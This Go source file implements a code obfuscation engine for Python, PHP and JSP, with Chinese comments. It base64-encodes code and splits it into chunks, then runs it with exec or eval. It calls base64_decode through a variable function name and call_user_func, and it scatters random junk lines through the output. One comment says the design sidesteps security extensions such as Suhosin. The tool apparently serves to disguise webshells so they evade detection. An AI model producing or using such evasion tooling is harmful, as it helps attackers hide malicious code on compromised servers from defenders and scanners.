package main

import (
	"encoding/base64"
	"math/rand"
	"strings"
	"time"
	"unicode"
)

// b64Encode base64 编码字节流
func b64Encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data)
}

// ============ 代码混淆引擎（与 obfuscator.py 对齐）============
// 支持 Python / PHP / JSP 三种语言的混淆
// 混淆级别: low / medium / high / extreme

var junkPool = map[string][]string{
	"py": {
		"{v}=0\nif {v}>0 and {v}<1:pass",
		"try:\n {v}=0\nexcept:pass",
		"{v}=lambda x:x if x else None",
		"{v}=[i for i in range(0)]",
		"{v}=False\nwhile {v} and False:break",
	},
	"php": {
		"if(${v}>0&&${v}<1){{}}",
		"${v}=function($x){{return $x?$x:null;}};",
		"${v}=array_filter(array());",
		"while(false){{break;}}",
		"${v}=0;(string)${v};",
		"${v}=isset($_SERVER)?false:false;",
		"${v}=null;${v}=${v}?:${v};",
	},
	"jsp": {
		"if({v}>0&&{v}<1){{}}",
		"int {v}=0;while(false){{break;}}",
		"for(int {v}=0;{v}<0;{v}++){{}}",
		"long {v}=0L;if({v}>0){{}}",
	},
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

// randVar 生成随机变量名（前缀 + 4-8 位字母数字）
func randVar(prefix string) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 4 + rand.Intn(5)
	result := prefix
	for i := 0; i < length; i++ {
		result += string(charset[rand.Intn(len(charset))])
	}
	return result
}

// randClassName 生成随机类名（大写开头 + 4-8 位字母数字）
func randClassName() string {
	const upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	const alnum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := string(upper[rand.Intn(len(upper))])
	length := 4 + rand.Intn(5)
	for i := 0; i < length; i++ {
		result += string(alnum[rand.Intn(len(alnum))])
	}
	return result
}

// injectJunk 在代码中注入垃圾行
func injectJunk(code, lang string, count int) string {
	pool, ok := junkPool[lang]
	if !ok {
		return code
	}
	lines := strings.Split(code, "\n")
	for i := 0; i < count; i++ {
		v := randVar("_")
		c := randClassName()
		junk := strings.ReplaceAll(pool[rand.Intn(len(pool))], "{v}", v)
		junk = strings.ReplaceAll(junk, "{c}", c)
		pos := rand.Intn(len(lines) + 1)
		// 插入到指定位置
		lines = append(lines, "")
		copy(lines[pos+1:], lines[pos:])
		lines[pos] = junk
	}
	return strings.Join(lines, "\n")
}

// b64EncodeStr base64 编码字符串
func b64EncodeStr(s string) string {
	return b64Encode([]byte(s))
}

// obfuscatePython Python 代码混淆（与 obfuscator.py obfuscate_python 对齐）
func obfuscatePython(code, level string) string {
	if level == "low" {
		return code
	}
	lines := strings.TrimSpace(code)
	bVar := randVar("_b")
	b64Code := b64EncodeStr(lines)

	var resultBody string
	if level == "extreme" {
		// 极高混淆: 分块 base64
		chunks := []string{}
		for i := 0; i < len(b64Code); i += 64 {
			end := i + 64
			if end > len(b64Code) {
				end = len(b64Code)
			}
			chunks = append(chunks, b64Code[i:end])
		}
		chunkVars := []string{}
		body := ""
		for _, chunk := range chunks {
			v := randVar("_c")
			body += v + "='" + chunk + "'\n"
			chunkVars = append(chunkVars, v)
		}
		body += "exec(" + bVar + ".b64decode(''.join([" + strings.Join(chunkVars, ",") + "])).decode())\n"
		resultBody = body
	} else {
		// high: 单块 base64 + 随机变量名
		v := randVar("_p")
		resultBody = v + "='" + b64Code + "'\nexec(" + bVar + ".b64decode(" + v + ").decode())\n"
	}

	junkCount := 10
	if level == "extreme" {
		junkCount = 20
	}
	junkBody := injectJunk(resultBody, "py", junkCount)
	return "import base64 as " + bVar + "\n" + junkBody
}

// obfuscatePHP PHP 代码混淆（与 obfuscator.py obfuscate_php 对齐）
// 注意: 不使用 @eval(base64_decode()) 包裹整个代码，因为会导致 php://input 流读取失败
//       且可能被 Suhosin 等安全扩展禁用。改用 call_user_func + 变量函数名方式
func obfuscatePHP(code, level string) string {
	if level == "low" {
		return code
	}

	// 提取 PHP 代码内容（去掉 <?php ?> 标记）
	raw := strings.TrimSpace(code)
	raw = strings.TrimPrefix(raw, "<?php")
	raw = strings.TrimPrefix(raw, "<?")
	raw = strings.TrimSuffix(raw, "?>")
	raw = strings.TrimSpace(raw)

	b64 := b64EncodeStr(raw)

	// medium: base64 解码后用 eval 执行
	if level == "medium" {
		v1 := randVar("_a")
		v2 := randVar("_b")
		v3 := randVar("_f") // 变量函数名
		body := "$" + v3 + "='base64_decode';\n"
		body += "$" + v1 + "='" + b64 + "';\n"
		body += "$" + v2 + "=call_user_func($" + v3 + ", $" + v1 + ");\n"
		body += "if($" + v2 + "){eval($" + v2 + ");}\n"
		return "<?php\n" + body + "?>"
	}

	// high/extreme: 分块 base64 + call_user_func + eval + 垃圾代码
	var body string
	var b64Var string
	if level == "extreme" {
		chunks := []string{}
		for i := 0; i < len(b64); i += 64 {
			end := i + 64
			if end > len(b64) {
				end = len(b64)
			}
			chunks = append(chunks, b64[i:end])
		}
		chunkVars := []string{}
		for _, chunk := range chunks {
			v := randVar("_c")
			body += "$" + v + "='" + chunk + "';\n"
			chunkVars = append(chunkVars, "$"+v)
		}
		b64Var = randVar("_b")
		body += "$" + b64Var + "=implode('',array(" + strings.Join(chunkVars, ",") + "));\n"
	} else {
		// high
		v1 := randVar("_a")
		b64Var = v1
		body = "$" + v1 + "='" + b64 + "';\n"
	}

	v2 := randVar("_d")
	v3 := randVar("_f") // 变量函数名
	body += "$" + v3 + "='base64_decode';\n"
	body += "$" + v2 + "=call_user_func($" + v3 + ", $" + b64Var + ");\n"
	body += "if($" + v2 + "){eval($" + v2 + ");}\n"

	// 垃圾代码块
	junkCount := 15
	if level == "extreme" {
		junkCount = 30
	}
	junkLines := []string{}
	for i := 0; i < junkCount; i++ {
		v := randVar("_j")
		c := randClassName()
		junk := strings.ReplaceAll(junkPool["php"][rand.Intn(len(junkPool["php"]))], "{v}", v)
		junk = strings.ReplaceAll(junk, "{c}", c)
		junkLines = append(junkLines, junk)
	}

	return "<?php\n" + strings.Join(junkLines, "\n") + "\n" + body + "?>"
}

// obfuscateJSP JSP 代码混淆（与 obfuscator.py obfuscate_jsp 对齐）
func obfuscateJSP(code, level string) string {
	if level == "low" {
		return code
	}
	if level == "high" || level == "extreme" {
		count := 10
		if level == "extreme" {
			count = 20
		}
		return injectJunk(code, "jsp", count)
	}
	return code
}

// obfuscate 统一混淆入口（与 obfuscator.py obfuscate 对齐）
func obfuscate(code, lang, level string) string {
	if level == "" {
		level = "high"
	}
	switch lang {
	case "py":
		return obfuscatePython(code, level)
	case "php":
		return obfuscatePHP(code, level)
	case "jsp":
		return obfuscateJSP(code, level)
	default:
		return code
	}
}

// isAlpha 检查是否为字母
func isAlpha(r rune) bool {
	return unicode.IsLetter(r)
}
